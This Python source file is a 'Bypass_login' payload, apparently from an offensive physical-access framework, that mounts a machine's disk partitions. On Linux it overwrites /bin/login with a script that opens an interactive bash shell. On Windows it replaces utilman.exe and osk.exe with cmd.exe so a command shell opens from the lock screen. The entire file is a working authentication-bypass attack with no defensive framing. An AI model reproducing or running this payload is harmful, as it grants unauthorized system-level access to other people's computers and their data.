#!/usr/bin/python3
"""
Bypass_login payload
"""
from snr.core.payload import entry_point, storage
from snr.core.util import common_utils, programs

PASSPHRASES = "@PASSPHRASES@"


@entry_point.entry_point
def main(block_info: storage.BlocksType, *_) -> None:
    for part in storage.query_all_partitions(block_info):
        with storage.mount_partition(part, PASSPHRASES) as mounted_part:
            part_info = storage.query_partition_info_by_path(part, block_info)
            assert part_info is not None
            # Try to see if we are dealing with any sort of Linux
            if mounted_part.is_linux():
                # On Linux, replace login with a script that calls bash
                if mounted_part.exists("bin/login.bak"):
                    mounted_part.remove("bin/login.bak")
                mounted_part.copy("bin/login", "bin/login.bak")
                mounted_part.remove("bin/login")
                # You might wonder, why not wrap around login binary itself?
                # Because we don't know if root login is blocked or not
                with mounted_part.open("bin/login", "w", encoding="utf-8") as stream:
                    stream.write("#!/bin/bash\n")
                    stream.write("exec /bin/bash -il\n")
                programs.Chmod().invoke_and_wait(None, "+x", mounted_part.join("bin/login"))

            elif mounted_part.is_windows():
                # Use the utilman trick
                for program in ("utilman.exe", "osk.exe"):
                    if mounted_part.exists(f"Windows/System32/{program}.bak"):
                        mounted_part.remove(f"Windows/System32/{program}.bak")
                    mounted_part.copy(
                        f"Windows/System32/{program}", f"Windows/System32/{program}.bak")
                    mounted_part.remove(f"Windows/System32/{program}")
                    mounted_part.copy("Windows/System32/cmd.exe",
                                      f"Windows/System32/{program}")
            else:
                common_utils.print_warning("Unknown operating system!")

if __name__ == "__main__":
    main()
